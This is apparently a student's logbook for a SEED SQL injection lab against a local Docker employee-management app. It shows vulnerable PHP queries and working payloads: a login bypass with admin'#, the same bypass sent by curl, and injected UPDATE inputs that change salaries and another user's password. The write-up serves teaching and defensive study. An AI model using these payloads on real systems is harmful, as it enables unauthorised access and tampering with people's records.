# LOGBOOK 8

## SQL Injection Attack Lab

### What is an SQL Injection Attack?

SQL injection is a code injection technique that exploits a security vulnerability in the interface between a web application and its database. The vulnerability occurs when the web application fails to properly sanitize user-supplied input which is then used in an SQL query. The attacker can generally use SQLi to either bypass authentication, retrieve sensitive data, or modify data in the database. SQL injection is one of the most common and dangerous attacks on web applications. It is vital for web developers to understand the nature of this attack and how to prevent it.

### Lab Environment and Setup

As specified, there are two containers in this lab, one for hosting the web application and the other for hosting its database. The IP address of the web application container is 10.9.0.5, and the URL of the web application is <http://www.seed-server.com>.

We successfully mapped this hostname to the IP address of the web application container by adding the following entry to the `/etc/hosts` file.

```
10.9.0.5    www.seed-server.com
```

We needed to use the `sudo` command to edit this file.

Finally, we used the `docker-compose` command to build and start the containers.

```bash
$ dcbuild       # alias for docker-compose build
$ dcup          # alias for docker-compose up
```

#### About the Web Application

The web application is a simple employee management system. There are two roles: Administrator and Employee. The administrator can manage each employee's personal information. Employee can view or update their own profile information.

### Lab Tasks

#### Task 1: Get Familiar with SQL Statements

We used the `docksh` command to get a shell inside the MySQL container. Before we could do this, we needed to find the MySQL container's ID. We did this by running the `dockps` command.

Inside the MySQL container, we executed the following:

```
mysql -u root -pdees
```

This allowed us to log in to the MySQL server as the root user. As the sqllab_users database was already created, we simply used the `use` command to load this existing database.

```
mysql> use sqllab_users;
```

To print all the tables in the database, we used the `show tables;` command.

```
mysql> show tables;
```

The output is shown in the following screenshot.

[TODO: Insert show_tables.png]

There is only one table named `credential` in the database. We used the `select` command to print all the records in this table, and have a look at the data.

```
mysql> select * from credential;
```

The result of this query is shown below.

[TODO: Insert select_all.png]

Lastly, as instructed, we used `select` to print the record of the user `Alice`.

```
mysql> select * from credential where Name = 'Alice';
```

[TODO: Insert select_alice.png]

#### Task 2.1: SQL Injection Attack from webpage

The web application has a login page, which allows users to log in with their username and password. 

This is the screenshot of the login page.

[TODO: Insert login_page.png]

The user authentication is implemented in the `unsafe_home.php` file. After reviewing the php code, we found that the following SQL statement is used to authenticate the user.

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password 
        FROM credential 
        WHERE name='$username' and Password='$hashed_pwd'";
```

We can see that the above statement is constructed using the username and password provided by the user, without any proper sanitization. This is a very dangerous practice, as it allows attackers to modify the SQL statement by manipulating the user input.

To demonstrate this, and bypass the authentication, we used the following username and password, to log in as `admin`.

``` 
Username: admin'#
Password: 11
```

The resulting query will be as follows.

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
        FROM credential
        WHERE name='admin'#' and Password='11'"
```

The `#` character is used to comment out the rest of the query. This means that the query will only check if the username `admin` exists in the database. The password will not be checked, granting us access to the admin account.

In the admin account, we have access to all the employee records, as shown in the following screenshot.

[TODO: Insert admin_access.png]

#### Task 2.2: SQL Injection Attack from command line

We can use the `curl` command to send HTTP requests to the web application. In the following example, we sent a request to the login page, with the username `Alice` and the password `11`.

```bash
$ curl 'www.seed-server.com/unsafe_home.php?username=alice&Password=11'
```

And we successfully logged in as `Alice`.

This allows us to perform the same attack as the previous task, but from the command line. We used the following command to log in as `admin`.

```bash
$ curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23&Password=11'
```

The `%27` is the URL encoding for the `'` character, and `%23` is the URL encoding for the `#` character. The resulting query is the same as the one in the previous task.

This is the screenshot of the command's output.

[TODO: Insert curl_admin.png]

#### Task 2.3: Append a new SQL statement

Such attacks do not work because of php's mysqli extension. The mysqli::query() function only allows one SQL statement to be executed at a time. This is due to the concern of SQL Injection attacks.

#### Task 3.1: Modify your own salary

Firstly, we logged in as `Alice`, and then clicked the Edit Profile button, which took us to the Edit Profile page shown below.

[TODO: Insert edit_profile.png]

The Edit Profile page allows us to update our personal information. It is implemented in the `unsafe_edit_backend.php` file. 

The following SQL statement is used to update the user's information.

```php
$sql = "UPDATE credential 
        SET nickname='$input_nickname', email='$input_email', address='$input_address', Password='%hashed_pwd', PhoneNumber='$input_phonenumber' 
        WHERE ID='$id'";
```

We can manipulate the SQL statement by modifying the input fields. For example, we can change the nickname to `Alice', salary='999999999`, which will result in the following query.

```php
$sql = "UPDATE credential 
        SET nickname='Alice', salary='999999999', email='$input_email', address='$input_address', Password='%hashed_pwd', PhoneNumber='$input_phonenumber' 
        WHERE ID='$id'";
```

This successfuly changed Alice's salary to 999999999. The following screenshot shows the result.

[TODO: Insert alice_salary.png]

#### Task 3.2: Modify other people's salary 

To modify other people's salary, in this case,`Boby`, we can use a similar technique, with the nuance that the user is different from the one logged in. We can use the following input.

```
', salary='1' WHERE Name = 'Boby'#
```

This will result in the following query.

```php
$sql = "UPDATE credential 
        SET nickname='', salary='1' WHERE Name = 'Boby'#', email='$input_email', address='$input_address', Password='%hashed_pwd', PhoneNumber='$input_phonenumber' 
        WHERE ID='$id'";
```

The `#` character is placed so that the rest of the query is commented out. The ID check placed at the end will not be executed, and this will effectively change Boby's salary to 1, as we can see here.

[TODO: Insert boby_salary.png]

#### Task 3.3: Modify other people's password

This time, we need to change Boby's password.

This task is not as simple as the previous ones, as the password needs to be hashed before being stored in the database. 

Analyzing the php code, we see that the phone number is set after the password is hashed. 

Our approach was to place the new password in the password field, and use the phone number field to place the `WHERE` clause. This way, the password will be hashed, and the phone number will be used to select the user Boby.

The following input was used.

- Phone Number:
  
```
' WHERE Name = 'Boby'#
```

- Password:
  
```
123
```

When we got back to the home page, we got an error message, as expected. This is because the password we entered doesn't match the one in the database. However, when we checked the database, we could see that the password hash was changed.

[TODO: Insert boby_password.png]

And now we can log in as Boby, using the password `123`.